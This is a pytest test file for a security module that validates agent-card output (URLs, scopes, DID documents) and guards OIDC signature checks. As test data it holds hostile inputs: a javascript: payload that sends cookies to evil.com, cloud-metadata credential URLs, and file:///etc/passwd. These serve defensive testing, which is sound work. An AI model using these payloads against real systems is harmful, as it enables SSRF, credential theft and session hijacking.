"""Tests for security patches — output validation + OIDC dev guard."""

import os
import pytest
from aib.security_patches import (
    validate_output_url, validate_output_string, validate_output_scopes,
    validate_output_document_size,
    validate_mcp_output, validate_a2a_output, validate_did_output,
    validate_translator_output,
    OutputValidationError,
    guard_verify_signature, is_development_mode, OIDCDevGuardError,
    oidc_dev_guard,
)


# ═══════════════════════════════════════════════════════════════════
# Output URL validation
# ═══════════════════════════════════════════════════════════════════

class TestOutputURLValidation:

    def test_valid_https_url(self):
        url = validate_output_url("https://partner.com/agent", "server_url")
        assert url == "https://partner.com/agent"

    def test_empty_url_passes(self):
        assert validate_output_url("", "url") == ""

    def test_reject_javascript_scheme(self):
        with pytest.raises(OutputValidationError, match="dangerous"):
            validate_output_url("javascript:alert(1)", "url")

    def test_reject_data_scheme(self):
        with pytest.raises(OutputValidationError, match="dangerous"):
            validate_output_url("data:text/html,<script>", "url")

    def test_reject_file_scheme(self):
        with pytest.raises(OutputValidationError, match="dangerous"):
            validate_output_url("file:///etc/passwd", "url")

    def test_reject_localhost(self):
        with pytest.raises(OutputValidationError, match="dangerous"):
            validate_output_url("https://localhost:8080/api", "url")

    def test_reject_private_ip_10(self):
        with pytest.raises(OutputValidationError, match="dangerous"):
            validate_output_url("https://10.0.0.1/admin", "url")

    def test_reject_private_ip_192(self):
        with pytest.raises(OutputValidationError, match="dangerous"):
            validate_output_url("https://192.168.1.1/api", "url")

    def test_reject_metadata_endpoint(self):
        with pytest.raises(OutputValidationError, match="dangerous"):
            validate_output_url("http://169.254.169.254/latest/meta-data", "url")

    def test_reject_google_metadata(self):
        with pytest.raises(OutputValidationError, match="dangerous"):
            validate_output_url("http://metadata.google.internal/v1", "url")

    def test_reject_127001(self):
        with pytest.raises(OutputValidationError, match="dangerous"):
            validate_output_url("https://127.0.0.1:9090/internal", "url")

    def test_reject_ftp_scheme(self):
        with pytest.raises(OutputValidationError, match="dangerous"):
            validate_output_url("ftp://files.internal/data", "url")

    def test_reject_embedded_credentials(self):
        with pytest.raises(OutputValidationError, match="credentials"):
            validate_output_url("https://admin:pass@example.com/api", "url")

    def test_reject_oversized_url(self):
        long_url = "https://example.com/" + "a" * 3000
        with pytest.raises(OutputValidationError, match="exceeds"):
            validate_output_url(long_url, "url")


# ═══════════════════════════════════════════════════════════════════
# Output string validation
# ═══════════════════════════════════════════════════════════════════

class TestOutputStringValidation:

    def test_valid_string(self):
        assert validate_output_string("My Agent", "name") == "My Agent"

    def test_reject_non_string(self):
        with pytest.raises(OutputValidationError, match="expected string"):
            validate_output_string(123, "name")

    def test_reject_control_characters(self):
        with pytest.raises(OutputValidationError, match="control"):
            validate_output_string("hello\x00world", "name")

    def test_reject_oversized(self):
        with pytest.raises(OutputValidationError, match="exceeds"):
            validate_output_string("x" * 1500, "name")


# ═══════════════════════════════════════════════════════════════════
# Scope/permission validation
# ═══════════════════════════════════════════════════════════════════

class TestOutputScopeValidation:

    def test_valid_scopes(self):
        scopes = validate_output_scopes(["read:calendar", "write:booking"], "scopes")
        assert len(scopes) == 2

    def test_reject_wildcard_scope(self):
        with pytest.raises(OutputValidationError, match="escalation"):
            validate_output_scopes(["read", "*"], "scopes")

    def test_reject_admin_scope(self):
        with pytest.raises(OutputValidationError, match="escalation"):
            validate_output_scopes(["read", "admin"], "scopes")

    def test_reject_root_scope(self):
        with pytest.raises(OutputValidationError, match="escalation"):
            validate_output_scopes(["root"], "scopes")

    def test_reject_superuser_scope(self):
        with pytest.raises(OutputValidationError, match="escalation"):
            validate_output_scopes(["superuser"], "scopes")

    def test_too_many_scopes(self):
        scopes = [f"scope_{i}" for i in range(25)]
        with pytest.raises(OutputValidationError, match="too many"):
            validate_output_scopes(scopes, "scopes")

    def test_skip_escalation_check(self):
        # When check_escalation=False, admin is allowed
        scopes = validate_output_scopes(["admin"], "scopes", check_escalation=False)
        assert scopes == ["admin"]

    def test_reject_non_list(self):
        with pytest.raises(OutputValidationError, match="expected list"):
            validate_output_scopes("read write", "scopes")


# ═══════════════════════════════════════════════════════════════════
# Full output document validation
# ═══════════════════════════════════════════════════════════════════

class TestMCPOutputValidation:

    def test_valid_mcp_card(self):
        card = {
            "name": "Calendar Service",
            "server_url": "https://calendar.api/mcp",
            "tools": [{"name": "create_event", "description": "Create a calendar event"}],
            "auth": {"type": "oauth2"},
        }
        result = validate_mcp_output(card)
        assert result["name"] == "Calendar Service"

    def test_reject_dangerous_server_url(self):
        card = {"server_url": "https://169.254.169.254/latest", "name": "Evil"}
        with pytest.raises(OutputValidationError):
            validate_mcp_output(card)

    def test_reject_too_many_tools(self):
        card = {"tools": [{"name": f"t{i}"} for i in range(60)]}
        with pytest.raises(OutputValidationError, match="too many"):
            validate_mcp_output(card)

    def test_reject_bad_auth_type(self):
        card = {"auth": {"type": "evil_custom_auth"}}
        with pytest.raises(OutputValidationError, match="unexpected"):
            validate_mcp_output(card)

    def test_validate_oauth_flow_urls(self):
        card = {
            "auth": {
                "type": "oauth2",
                "flows": {
                    "authorization_code": {
                        "authorizationUrl": "https://localhost:8080/auth",
                    }
                }
            }
        }
        with pytest.raises(OutputValidationError, match="dangerous"):
            validate_mcp_output(card)


class TestA2AOutputValidation:

    def test_valid_a2a_card(self):
        card = {
            "name": "Booking Agent",
            "url": "https://partner.com/agent",
            "skills": [{"id": "booking", "name": "Booking"}],
        }
        result = validate_a2a_output(card)
        assert result["name"] == "Booking Agent"

    def test_reject_dangerous_url(self):
        card = {"url": "http://10.0.0.1/internal"}
        with pytest.raises(OutputValidationError):
            validate_a2a_output(card)

    def test_reject_too_many_skills(self):
        card = {"skills": [{"id": f"s{i}"} for i in range(55)]}
        with pytest.raises(OutputValidationError, match="too many"):
            validate_a2a_output(card)


class TestDIDOutputValidation:

    def test_valid_did_document(self):
        doc = {
            "id": "did:web:peer.org:agents:bot",
            "service": [{"serviceEndpoint": "https://peer.org/anp"}],
        }
        result = validate_did_output(doc)
        assert result["id"].startswith("did:")

    def test_reject_non_did_id(self):
        doc = {"id": "not-a-did"}
        with pytest.raises(OutputValidationError, match="did:"):
            validate_did_output(doc)

    def test_reject_dangerous_service_endpoint(self):
        doc = {
            "id": "did:web:example",
            "service": [{"serviceEndpoint": "http://192.168.1.1/internal"}],
        }
        with pytest.raises(OutputValidationError):
            validate_did_output(doc)


class TestTranslatorOutputDispatch:

    def test_dispatch_mcp(self):
        card = {"name": "Test", "server_url": "https://example.com"}
        result = validate_translator_output(card, "mcp")
        assert result["name"] == "Test"

    def test_dispatch_a2a(self):
        card = {"name": "Test", "url": "https://example.com"}
        result = validate_translator_output(card, "a2a")
        assert result["name"] == "Test"

    def test_dispatch_did(self):
        doc = {"id": "did:web:example"}
        result = validate_translator_output(doc, "did")
        assert result["id"] == "did:web:example"

    def test_dispatch_unknown_format(self):
        doc = {"something": "value"}
        result = validate_translator_output(doc, "unknown_format")
        assert result == doc  # Generic validation only

    def test_oversized_document(self):
        huge = {"data": "x" * 60000}
        with pytest.raises(OutputValidationError, match="exceeds"):
            validate_translator_output(huge, "mcp")


# ═══════════════════════════════════════════════════════════════════
# OIDC Dev Guard
# ═══════════════════════════════════════════════════════════════════

class TestOIDCDevGuard:

    def test_verify_true_always_passes(self):
        assert guard_verify_signature(True) is True

    def test_verify_false_blocked_in_production(self):
        # Ensure we're NOT in dev mode
        old_env = os.environ.get("AIB_ENV")
        os.environ.pop("AIB_ENV", None)
        try:
            with pytest.raises(OIDCDevGuardError, match="only allowed"):
                guard_verify_signature(False)
        finally:
            if old_env:
                os.environ["AIB_ENV"] = old_env

    def test_verify_false_allowed_in_dev(self):
        old_env = os.environ.get("AIB_ENV")
        os.environ["AIB_ENV"] = "development"
        try:
            assert guard_verify_signature(False) is False
        finally:
            if old_env:
                os.environ["AIB_ENV"] = old_env
            else:
                os.environ.pop("AIB_ENV", None)

    def test_verify_false_allowed_in_test(self):
        old_env = os.environ.get("AIB_ENV")
        os.environ["AIB_ENV"] = "test"
        try:
            assert guard_verify_signature(False) is False
        finally:
            if old_env:
                os.environ["AIB_ENV"] = old_env
            else:
                os.environ.pop("AIB_ENV", None)

    def test_verify_false_blocked_with_production_env(self):
        old_env = os.environ.get("AIB_ENV")
        os.environ["AIB_ENV"] = "production"
        try:
            with pytest.raises(OIDCDevGuardError):
                guard_verify_signature(False)
        finally:
            if old_env:
                os.environ["AIB_ENV"] = old_env
            else:
                os.environ.pop("AIB_ENV", None)

    def test_is_development_mode(self):
        old_env = os.environ.get("AIB_ENV")
        for env in ("development", "dev", "test", "testing", "local"):
            os.environ["AIB_ENV"] = env
            assert is_development_mode() is True, f"Failed for AIB_ENV={env}"

        for env in ("production", "staging", "prod", ""):
            os.environ["AIB_ENV"] = env
            assert is_development_mode() is False, f"Failed for AIB_ENV={env}"

        os.environ.pop("AIB_ENV", None)
        assert is_development_mode() is False  # Default = not dev

        if old_env:
            os.environ["AIB_ENV"] = old_env

    def test_decorator(self):
        @oidc_dev_guard
        def fake_exchange(token, verify_signature=True):
            return "ok"

        # verify_signature=True always works
        assert fake_exchange("token", verify_signature=True) == "ok"

        # verify_signature=False blocked in prod
        old_env = os.environ.get("AIB_ENV")
        os.environ.pop("AIB_ENV", None)
        try:
            with pytest.raises(OIDCDevGuardError):
                fake_exchange("token", verify_signature=False)
        finally:
            if old_env:
                os.environ["AIB_ENV"] = old_env

    def test_decorator_allows_dev(self):
        @oidc_dev_guard
        def fake_exchange(token, verify_signature=True):
            return "ok"

        old_env = os.environ.get("AIB_ENV")
        os.environ["AIB_ENV"] = "dev"
        try:
            assert fake_exchange("token", verify_signature=False) == "ok"
        finally:
            if old_env:
                os.environ["AIB_ENV"] = old_env
            else:
                os.environ.pop("AIB_ENV", None)


# ═══════════════════════════════════════════════════════════════════
# Integration: Translation Injection scenarios
# ═══════════════════════════════════════════════════════════════════

class TestTranslationInjectionScenarios:
    """
    Simulate real translation injection attacks.

    These test cases represent what an attacker would try:
    craft an input that passes input validation but produces
    dangerous output after translation.
    """

    def test_redirect_url_injection(self):
        """Attacker embeds a redirect to internal service in agent URL."""
        card = {
            "name": "Legit Agent",
            "url": "https://10.0.0.1/internal-api",  # Private IP
            "skills": [],
        }
        with pytest.raises(OutputValidationError):
            validate_a2a_output(card)

    def test_metadata_endpoint_in_service(self):
        """Attacker targets cloud metadata via DID service endpoint."""
        doc = {
            "id": "did:web:evil.com",
            "service": [{
                "serviceEndpoint": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role"
            }],
        }
        with pytest.raises(OutputValidationError):
            validate_did_output(doc)

    def test_scope_escalation_via_translation(self):
        """Translation accidentally produces admin scope."""
        scopes = ["read:data", "write:data", "admin"]
        with pytest.raises(OutputValidationError, match="escalation"):
            validate_output_scopes(scopes, "auth.scopes")

    def test_wildcard_scope_injection(self):
        """Attacker injects wildcard scope to get all permissions."""
        with pytest.raises(OutputValidationError, match="escalation"):
            validate_output_scopes(["read", "*"], "scopes")

    def test_javascript_in_oauth_url(self):
        """Attacker injects javascript: in OAuth authorization URL."""
        card = {
            "auth": {
                "type": "oauth2",
                "flows": {
                    "implicit": {
                        "authorizationUrl": "javascript:document.location='https://evil.com/steal?token='+document.cookie"
                    }
                }
            }
        }
        with pytest.raises(OutputValidationError):
            validate_mcp_output(card)

    def test_oversized_output_bomb(self):
        """Attacker crafts input that explodes in size after translation."""
        card = {"name": "x" * 60000}
        with pytest.raises(OutputValidationError):
            validate_mcp_output(card)
